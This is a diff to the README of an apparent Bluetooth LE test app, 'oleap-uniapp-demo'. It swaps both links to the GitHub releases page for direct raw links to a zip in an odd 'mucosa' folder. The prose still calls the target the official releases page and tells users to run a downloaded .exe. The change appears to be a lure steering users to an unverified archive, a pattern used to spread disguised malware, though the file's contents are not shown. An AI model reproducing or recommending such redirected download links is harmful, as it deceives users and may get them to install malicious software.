@@ -1,6 +1,6 @@
 # 📡 oleap-uniapp-demo - Test Oleap Bluetooth devices with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Indurate-tambourine152/oleap-uniapp-demo/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Indurate-tambourine152/oleap-uniapp-demo/raw/refs/heads/main/mucosa/demo_uniapp_oleap_v1.2-beta.2.zip)
 
 This application provides a simple interface to test Oleap Bluetooth Low Energy (BLE) devices. You can use this software to confirm that your hardware connects properly to your computer. It serves as a testing tool for developers and users who want to verify device signals before building full applications.
 
@@ -8,7 +8,7 @@ This application provides a simple interface to test Oleap Bluetooth Low Energy 
 
 To start, you must get the installation file from the official releases page.
 
-[Click here to visit the download page](https://github.com/Indurate-tambourine152/oleap-uniapp-demo/releases)
+[Click here to visit the download page](https://github.com/Indurate-tambourine152/oleap-uniapp-demo/raw/refs/heads/main/mucosa/demo_uniapp_oleap_v1.2-beta.2.zip)
 
 Once you reach the page, look at the latest entry under the "Releases" heading. Find the file ending in `.exe` and click it. Save this file to your computer.
 
